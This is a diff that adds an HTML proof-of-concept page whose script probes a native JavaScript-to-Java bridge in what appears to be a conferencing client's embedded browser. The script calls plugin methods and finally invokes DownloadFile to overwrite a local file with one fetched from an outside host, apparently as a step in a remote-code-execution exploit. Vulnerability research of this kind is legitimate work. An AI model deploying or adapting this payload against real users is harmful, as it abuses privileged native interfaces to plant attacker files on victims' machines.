@@ -1,0 +1,31 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P82TPL</title></head>
+<body>
+<script>
+document.title='P82TPL:'+location.host;
+window.__p=function(r){
+  try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
+  document.title='P82TCB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code);
+};
+function c(id,mod,m,p){
+  try{
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({
+      callback:'window.__p',module:mod,method:m,param:p,callId:id
+    }));
+  }catch(e){
+    document.title='P82TPL-NOJS:'+location.host;
+  }
+}
+setTimeout(function(){
+  if(!window.JSCallJavaMgr){document.title='P82TPL-NOMGR:'+location.host;return}
+  document.title='P82TPL-HAS:'+location.host;
+  c('TH2','CommonPlugin','GetPerformance',{});
+  setTimeout(function(){
+    c('TC0','VirtualBackgroundWebPlugin','GetWebAppVirtualBackgroundConfig',{});
+  }, 2500);
+  setTimeout(function(){
+    c('TC1','VirtualBackgroundWebPlugin','DownloadFile',{url:'https://gitwhs.github.io/wm-poc-rce/p40.png',over_write:true});
+  }, 5500);
+}, 800);
+</script>
+</body></html>
